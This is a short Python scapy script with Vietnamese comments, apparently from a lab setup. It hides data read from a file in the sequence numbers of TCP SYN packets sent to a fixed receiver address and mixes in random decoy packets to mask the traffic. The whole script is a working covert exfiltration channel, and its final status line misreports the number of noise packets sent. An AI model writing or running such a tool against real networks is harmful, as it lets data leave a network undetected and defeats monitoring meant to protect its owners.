#!/usr/bin/env python3
from scapy.all import *
import time, random

def send_stealth_packets(dest_ip, sequences):
    # Gửi gói chứa data với TTL cố định
    for seq in sequences:
        send(IP(dst=dest_ip, ttl=64)/TCP(
            sport=12345,  # Cổng nguồn cố định
            dport=80,
            seq=seq,
            flags="S"
        ), verbose=0)
    
    # Gửi gói nhiễu với TTL ngẫu nhiên
    for _ in range(len(sequences)):
        send(IP(dst=dest_ip, ttl=random.randint(65,128))/TCP(
            sport=random.randint(1024,65535),
            dport=80,
            seq=random.randint(0, 2**32-1),
            flags="S"
        ), verbose=0)

if __name__ == "__main__":
    try:
        with open("sequences.txt", "r") as f:
            sequences = [int(line.strip()) for line in f]
        send_stealth_packets("172.27.0.3", sequences)  # IP receiver
        print(f"[+] Sent {len(sequences)} data packets with {len(sequences)+3} noise packets")
    except FileNotFoundError:
        print("Error: Run encode.py first to create sequences.txt")
